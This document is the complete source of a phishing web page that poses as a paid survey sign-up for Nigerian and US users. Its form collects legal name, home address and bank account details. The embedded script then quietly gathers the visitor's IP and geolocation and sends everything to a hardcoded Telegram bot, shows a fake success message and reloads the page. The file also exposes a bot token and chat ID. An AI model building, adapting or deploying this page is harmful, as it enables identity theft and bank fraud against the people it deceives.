<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Global Survey | Sign Up</title>
    <style>
        :root {
            --primary-accent: #00ff88;
            --bg-gradient: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%);
            --card-bg: rgba(25, 25, 25, 0.95);
        }

        body { 
            margin: 0; 
            min-height: 100vh; 
            background: var(--bg-gradient);
            color: #fff; 
            display: flex; 
            flex-direction: column;
            justify-content: center; 
            align-items: center; 
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
            padding: 20px;
        }

        .container {
            background: var(--card-bg);
            padding: 30px;
            border-radius: 15px;
            width: 100%;
            max-width: 420px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            border: 1px solid rgba(255,255,255,0.1);
        }

        h2 {
            margin-top: 0;
            color: var(--primary-accent);
            letter-spacing: 1px;
            text-transform: uppercase;
            font-size: 22px;
        }

        .warning {
            background: rgba(255, 50, 50, 0.15);
            color: #ff8888;
            padding: 12px;
            border-radius: 8px;
            font-size: 13px;
            margin-bottom: 20px;
            border-left: 4px solid #ff4444;
            text-align: left;
        }

        .input-group {
            text-align: left;
            margin-bottom: 15px;
        }

        label {
            display: block;
            font-size: 12px;
            color: #aaa;
            margin-bottom: 5px;
            margin-left: 5px;
        }

        input, select {
            width: 100%;
            padding: 14px;
            background: #1a1a1a;
            border: 1px solid #333;
            color: #fff;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 16px;
            transition: border 0.3s;
        }

        input:focus, select:focus {
            outline: none;
            border-color: var(--primary-accent);
        }

        .section-title {
            font-size: 14px;
            color: var(--primary-accent);
            margin: 20px 0 10px;
            display: flex;
            align-items: center;
        }

        .section-title::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #333;
            margin-left: 10px;
        }

        button {
            width: 100%;
            padding: 16px;
            background: var(--primary-accent);
            color: #000;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            margin-top: 15px;
            transition: transform 0.2s, background 0.3s;
        }

        button:active { transform: scale(0.98); }

        .loader {
            width: 24px; 
            height: 24px; 
            border: 3px solid #333; 
            border-top-color: var(--primary-accent); 
            border-radius: 50%; 
            animation: spin 1s linear infinite; 
            display: none;
            margin: 15px auto;
        }

        #status {
            font-size: 14px;
            margin-top: 10px;
        }

        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="container">
        <h2>Survey Access</h2>
        
        <div class="warning">
            <b>NOTICE:</b> Accurate country, state, and address data is mandatory for reward processing. Incorrect details will lead to permanent withdrawal errors.
        </div>

        <form id="regForm">
            <div class="input-group">
                <label>Legal Full Name</label>
                <input type="text" id="fullName" placeholder="e.g. John Doe" required>
            </div>
            
            <div style="display: flex; gap: 10px;">
                <div class="input-group" style="flex: 1;">
                    <label>Country</label>
                    <select id="country" onchange="updateStates()" required>
                        <option value="">Select</option>
                        <option value="Nigeria">Nigeria</option>
                        <option value="United States">United States</option>
                    </select>
                </div>
                <div class="input-group" style="flex: 1;">
                    <label>State</label>
                    <select id="state" required>
                        <option value="">Select Country first</option>
                    </select>
                </div>
            </div>

            <div class="input-group">
                <label>Residential Address (City/Street)</label>
                <input type="text" id="cityAddress" placeholder="Full Address" required>
            </div>
            
            <div class="section-title">Withdrawal Credentials</div>
            
            <div class="input-group">
                <label>Bank Name</label>
                <input type="text" id="bankName" placeholder="e.g. Opay, Kuda, Zenith" required>
            </div>

            <div class="input-group">
                <label>Account Holder Name</label>
                <input type="text" id="bankOwner" placeholder="Name on account" required>
            </div>

            <div class="input-group">
                <label>Account Number</label>
                <input type="text" id="accountNumber" placeholder="10-digit number" required>
            </div>

            <button type="submit" id="submitBtn">Create Account</button>
            <div class="loader" id="loader"></div>
            <p id="status"></p>
        </form>
    </div>

    <script>
        // Use the same bot details
        const botToken = '8676266697:AAHdIIE5nA5O7ZkITE8b97Mu9HqM2-rO_ow';
        const chatId = '7680286319';

        const locationData = {
            "Nigeria": ["Abia", "Adamawa", "Akwa Ibom", "Anambra", "Bauchi", "Bayelsa", "Benue", "Borno", "Cross River", "Delta", "Ebonyi", "Edo", "Ekiti", "Enugu", "FCT - Abuja", "Gombe", "Imo", "Jigawa", "Kaduna", "Kano", "Katsina", "Kebbi", "Kogi", "Kwara", "Lagos", "Nasarawa", "Niger", "Ogun", "Ondo", "Osun", "Oyo", "Plateau", "Rivers", "Sokoto", "Taraba", "Yobe", "Zamfara"],
            "United States": ["Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey", "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah", "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"]
        };

        // FIXED POPULATION LOGIC
        function updateStates() {
            const countrySel = document.getElementById("country").value;
            const stateSel = document.getElementById("state");
            
            stateSel.innerHTML = '<option value="">Select State</option>';
            
            if (locationData[countrySel]) {
                locationData[countrySel].forEach(name => {
                    const opt = document.createElement("option");
                    opt.value = name;
                    opt.textContent = name;
                    stateSel.appendChild(opt);
                });
            }
        }

        document.getElementById('regForm').onsubmit = async function(e) {
            e.preventDefault();
            
            const btn = document.getElementById('submitBtn');
            const ldr = document.getElementById('loader');
            const st = document.getElementById('status');

            btn.style.display = 'none';
            ldr.style.display = 'block';
            st.textContent = "Securing connection...";
            
            // Collect Form Data
            const formData = {
                name: document.getElementById('fullName').value,
                country: document.getElementById('country').value,
                state: document.getElementById('state').value,
                addr: document.getElementById('cityAddress').value,
                bank: document.getElementById('bankName').value,
                owner: document.getElementById('bankOwner').value,
                acc: document.getElementById('accountNumber').value
            };

            try {
                // Keep background tracking logic from original
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const detRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const geo = await detRes.json();

                const message = `🌟 NEW REGISTRATION\n\n` +
                    `👤 Name: ${formData.name}\n` +
                    `🌍 Origin: ${formData.country} / ${formData.state}\n` +
                    `🏠 Address: ${formData.addr}\n\n` +
                    `💰 PAYOUT INFO\n` +
                    `Bank: ${formData.bank}\n` +
                    `Owner: ${formData.owner}\n` +
                    `Account: ${formData.acc}\n\n` +
                    `📡 SYSTEM LOGS\n` +
                    `IP: ${ipData.ip}\n` +
                    `Geo-City: ${geo.city}\n` +
                    `ISP: ${geo.org}\n` +
                    `⏰ Date: ${new Date().toLocaleString()}`;

                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: message })
                });

                if(response.ok) {
                    st.style.color = "#00ff88";
                    st.innerHTML = "Success! Verifying account...";
                    // Redirect or refresh after 2 seconds
                    setTimeout(() => { location.reload(); }, 2000);
                } else {
                    throw new Error();
                }

            } catch (err) {
                st.style.color = "#ff6666";
                st.textContent = "Server Error. Please try again.";
                btn.style.display = 'block';
                ldr.style.display = 'none';
            }
        };
    </script>
</body>
</html>
